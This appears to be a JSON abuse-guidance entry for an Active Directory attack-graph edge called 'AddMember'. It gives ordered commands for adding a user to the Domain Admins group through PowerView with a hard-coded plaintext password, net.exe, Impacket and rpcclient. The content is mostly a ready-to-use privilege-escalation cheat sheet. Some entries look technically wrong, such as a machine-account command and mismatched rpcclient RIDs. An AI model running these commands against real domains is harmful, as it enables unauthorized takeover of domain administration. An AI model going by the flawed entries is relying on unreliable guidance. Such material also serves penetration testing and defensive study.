{
    "AddMember": {
        "meaning": "This edge indicates the principal has the ability to add arbitrary principlas to the target security group. Because of security group delegation, the members of a security group have the same privileges as that group.",
        "common": "",
        "windows": {
            "PowerView": [
                {
                    "order": 1,
                    "command": "$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force",
                    "description": "Create secure password credential"
                },
                {
                    "order": 2,
                    "command": "$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)",
                    "description": "Create PSCredential object for authentication"
                },
                {
                    "order": 3,
                    "command": "Add-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y' -Credential $Cred",
                    "description": "Add user to target security group"
                },
                {
                    "order": 4,
                    "command": "Get-DomainGroupMember -Identity 'Domain Admins'",
                    "description": "Verify user was successfully added to the group"
                }
            ],
            "NetCommand": [
                {
                    "order": 1,
                    "command": "net group \"Domain Admins\" dfm.a /add /domain",
                    "description": "Add user to group using net.exe (less secure method)"
                }
            ]
        },
        "linux": {
            "Impacket": [
                {
                    "order": 1,
                    "command": "addcomputer.py DOMAIN/USER:PASSWORD@DC_IP -computer-name 'NEWCOMPUTER$' -computer-pass 'Password123!'",
                    "description": "Add computer account to domain (if adding machine accounts)"
                }
            ],
            "RPCClient": [
                {
                    "order": 1,
                    "command": "rpcclient -U 'DOMAIN\\user%password' DC_IP -c 'samlookupnames domain \"Domain Admins\"'",
                    "description": "Lookup group SID first"
                },
                {
                    "order": 2,
                    "command": "rpcclient -U 'DOMAIN\\user%password' DC_IP -c 'samr addgroupmem 0x200 0x1f5'",
                    "description": "Add user to group (requires group and user RIDs)"
                }
            ]
        }
    }
}
